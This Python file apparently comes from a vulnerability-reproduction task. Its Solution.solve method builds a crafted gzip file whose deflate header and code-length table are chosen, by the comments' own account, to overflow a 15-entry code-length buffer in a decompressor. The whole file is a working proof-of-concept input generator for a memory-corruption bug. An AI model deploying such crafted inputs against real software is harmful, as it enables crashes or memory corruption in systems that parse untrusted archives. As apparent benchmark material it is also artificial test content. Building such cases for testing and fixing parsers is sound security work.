import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # GZIP Header (10 bytes)
        poc = bytearray([0x1f, 0x8b, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
        
        val = 0
        bits = 0
        output = bytearray()
        
        def write_bits(v, n):
            nonlocal val, bits, output
            for i in range(n):
                if (v >> i) & 1:
                    val |= (1 << bits)
                bits += 1
                if bits == 8:
                    output.append(val)
                    val = 0
                    bits = 0
                    
        def write_huffman_code(code_val, code_len):
            # Huffman codes are packed MSB first
            for i in range(code_len - 1, -1, -1):
                bit = (code_val >> i) & 1
                write_bits(bit, 1)

        # Deflate Block Header
        write_bits(1, 1)   # BFINAL = 1
        write_bits(2, 2)   # BTYPE = 2 (Dynamic Huffman)
        write_bits(0, 5)   # HLIT = 0 (257 codes)
        write_bits(0, 5)   # HDIST = 0 (1 code)
        write_bits(14, 4)  # HCLEN = 14 (18 code lengths). 
                           # Max is 15 (19 codes). 14 is enough to include index 17 (Sym 1).
                           # This is > 11, so it provides enough codes to overflow a buffer of size 15.

        # Code Lengths for the Code Length Alphabet
        # We need to define a tree to encode the Lit/Dist lengths (258 items).
        # We need Sym 18 (repeat 0), Sym 0 (literal 0), Sym 1 (literal 1).
        # Permutation: 16, 17, 18, 0, 8, ... 14, 1.
        # Index 2 -> Sym 18. Index 3 -> Sym 0. Index 17 -> Sym 1.
        # We set lengths to 2 for these, 0 for others.
        # Writing to Index 2 (Sym 18) corresponds to len_codes[18], which is OOB (buffer size 15).
        
        cl_vals = [0] * 18
        cl_vals[2] = 2     # Sym 18 -> Len 2
        cl_vals[3] = 2     # Sym 0  -> Len 2
        cl_vals[17] = 2    # Sym 1  -> Len 2
        
        for v in cl_vals:
            write_bits(v, 3)
            
        # Huffman Codes (Canonical):
        # Sym 0:  00
        # Sym 1:  01
        # Sym 18: 10
        
        # Encode Lit/Dist Lengths (258 lengths total)
        # Sequence: 256 zeros (0..255), 1 one (256/EOB), 1 zero (Dist 0).
        
        # 1. 138 zeros using Sym 18
        write_huffman_code(0b10, 2) # Sym 18
        write_bits(127, 7)          # Count 138 (127 + 11)
        
        # 2. 118 zeros using Sym 18
        write_huffman_code(0b10, 2) # Sym 18
        write_bits(107, 7)          # Count 118 (107 + 11)
        
        # 3. 1 one using Sym 1 (for EOB)
        write_huffman_code(0b01, 2) # Sym 1
        
        # 4. 1 zero using Sym 0 (for Dist 0)
        write_huffman_code(0b00, 2) # Sym 0
        
        # Compressed Data
        # Only symbol 256 (EOB) is present.
        # Lit/Dist tree has Sym 256 with length 1. Code is '0'.
        write_huffman_code(0, 1)
        
        # Flush remaining bits
        if bits > 0:
            output.append(val)
            
        poc.extend(output)
        
        # GZIP Footer (CRC32 and ISIZE for empty file are 0)
        poc.extend(struct.pack("<I", 0))
        poc.extend(struct.pack("<I", 0))
        
        return bytes(poc)